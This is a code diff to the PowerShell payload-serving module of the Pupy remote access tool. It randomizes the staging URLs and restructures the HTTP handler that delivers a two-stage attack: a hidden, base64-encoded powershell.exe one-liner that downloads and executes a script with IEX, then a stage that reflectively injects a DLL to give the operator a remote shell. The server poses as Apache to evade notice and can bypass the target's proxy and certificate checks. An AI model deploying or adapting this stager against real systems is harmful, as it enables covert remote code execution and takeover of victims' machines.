@@ -8,73 +8,23 @@ from pupylib.PupyOutput import List, Success, Warn
 
 from base64 import b64encode
 from ssl import wrap_socket
+
+from string import letters
+from random import choice
+
 import tempfile
 import os.path
 import pupygen
 import ssl
 import socket
 
-# "url_random_one" and "url_random_two_x*" variables are fixed because if you break you ps1_listener, the ps1_listener payload will not be able to get stages -:(
-url_random_one      = "index.html"
-url_random_two_x86  = "voila.html"
-url_random_two_x64  = "tata.html"
-
 APACHE_DEFAULT_404 = """<html><body><h1>It works!</h1>
 <p>This is the default web page for this server.</p>
 <p>The web server software is running but no content has been added, yet.</p>
 </body></html>"""
 
-class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
-    display = None
-
-    def __init__(self, display, *args, **kwargs):
-        self.display = display
-        super(PupyPayloadHTTPHandler, self).__init__(*args, **kwargs)
-
-    def do_GET(self):
-        self.server_version = "Apache/2.4.27 (Unix)"
-        self.sys_version    = ""
-
-        if self.path == "/%s" % url_random_one:
-
-            self.send_response(200)
-            self.send_header('Content-type','text/html')
-            self.end_headers()
-
-            # Send stage 1 to target
-            self.wfile.write(self.server.stage1)
-            self.display(Success('[Stage 1/2] Powershell script served !'))
-
-        elif self.path == "/%s" % url_random_two_x86 or self.path == "/%s" % url_random_two_x64:
-            self.send_response(200)
-            self.send_header('Content-type','text/html')
-            self.end_headers()
-
-            stage2 = None
-            if self.path == "/%s" % url_random_two_x86:
-                self.display(Success('Remote script is running in a x86 powershell process'))
-                stage2 = self.server.stage2_x86
-            else:
-                self.display(Success('Remote script is running in a x64 powershell process'))
-                stage2 = self.server.stage2_x64
-
-            # Send stage 2 to target
-            self.wfile.write(stage2)
-
-            self.display(Success(
-                '[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!'))
-            self.display(Success(
-                '{}:You should have a pupy shell in few seconds from this host...'.format(
-                    self.client_address[0])))
-
-        else:
-            self.send_response(404)
-            self.send_header('Content-type','text/html')
-            self.end_headers()
-            self.wfile.write(APACHE_DEFAULT_404)
-
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
-    def set(self,conf, sslEnabled, stage1, stage2_x86, stage2_x64):
+    def set(self, conf, sslEnabled, stage1, stage2_x86, stage2_x64):
         self.payload_conf   = conf
         self.stage1         = stage1
         self.stage2_x86     = stage2_x86
@@ -106,8 +56,12 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
         self.socket.close()
 
 def serve_ps1_payload(display, conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True, nothidden=False):
-    try:
 
+    url_random_one      = ''.join(choice(letters) for _ in xrange(10)) + '.txt'
+    url_random_two_x86  = ''.join(choice(letters) for _ in xrange(10)) + '.txt'
+    url_random_two_x64  = ''.join(choice(letters) for _ in xrange(10)) + '.txt'
+
+    try:
         protocol             = 'http'
         ssl_cert_validation  = ''
         not_use_target_proxy = ''
@@ -124,12 +78,17 @@ def serve_ps1_payload(display, conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>
             not_use_target_proxy = '$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();'
 
         powershell      = "[NOT_USE_TARGET_PROXY][SSL_CERT_VALIDATION]IEX(New-Object Net.WebClient).DownloadString('[PROTOCOL]://[LINK_IP]:[LINK_PORT]/[RANDOM]');"
-        repls           = ('[NOT_USE_TARGET_PROXY]', not_use_target_proxy), ('[SSL_CERT_VALIDATION]', ssl_cert_validation), ('[PROTOCOL]', protocol), ('[LINK_IP]', '%s' % link_ip), ('[LINK_PORT]', '%s' % port)
+        repls           = ('[NOT_USE_TARGET_PROXY]', not_use_target_proxy), \
+            ('[SSL_CERT_VALIDATION]', ssl_cert_validation), \
+            ('[PROTOCOL]', protocol), \
+            ('[LINK_IP]', '%s' % link_ip), \
+            ('[LINK_PORT]', '%s' % port)
+
         powershell      = reduce(lambda a, kv: a.replace(*kv), repls, powershell)
 
         launcher            = powershell.replace('[RANDOM]', url_random_one)
         basic_launcher      = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
-        oneliner            = basic_launcher.replace('[CMD]', '-c \"%s\"' % launcher)
+        oneliner            = basic_launcher.replace('[CMD]', '-c %s' % repr(launcher))
         encoded_oneliner    = basic_launcher.replace('[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))
 
         # Compute stage1 to gain time response
@@ -165,10 +124,50 @@ def serve_ps1_payload(display, conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>
         stage2_x86 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x86))
         stage2_x64 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x64))
 
-        server = ThreadedHTTPServer(
-            (ip, port),
-            lambda *args, **kwargs: PupyPayloadHTTPHandler(display, *args, **kwargs))
+        class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
+            def do_GET(self):
+                self.server_version = "Apache/2.4.27 (Unix)"
+                self.sys_version    = ""
 
+                if self.path == "/%s" % url_random_one:
+
+                    self.send_response(200)
+                    self.send_header('Content-type','text/html')
+                    self.end_headers()
+
+                    # Send stage 1 to target
+                    self.wfile.write(self.server.stage1)
+                    display(Success('[Stage 1/2] Powershell script served !'))
+
+                elif self.path == "/%s" % url_random_two_x86 or self.path == "/%s" % url_random_two_x64:
+                    self.send_response(200)
+                    self.send_header('Content-type','text/html')
+                    self.end_headers()
+
+                    stage2 = None
+                    if self.path == "/%s" % url_random_two_x86:
+                        display(Success('Remote script is running in a x86 powershell process'))
+                        stage2 = self.server.stage2_x86
+                    else:
+                        display(Success('Remote script is running in a x64 powershell process'))
+                        stage2 = self.server.stage2_x64
+
+                    # Send stage 2 to target
+                    self.wfile.write(stage2)
+
+                    display(Success(
+                        '[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!'))
+                    display(Success(
+                        '{}:You should have a pupy shell in few seconds from this host...'.format(
+                            self.client_address[0])))
+
+                else:
+                    self.send_response(404)
+                    self.send_header('Content-type','text/html')
+                    self.end_headers()
+                    self.wfile.write(APACHE_DEFAULT_404)
+
+        server = ThreadedHTTPServer((ip, port), PupyPayloadHTTPHandler)
         server.set(conf, sslEnabled, stage1, stage2_x86, stage2_x64)
 
         display(List([
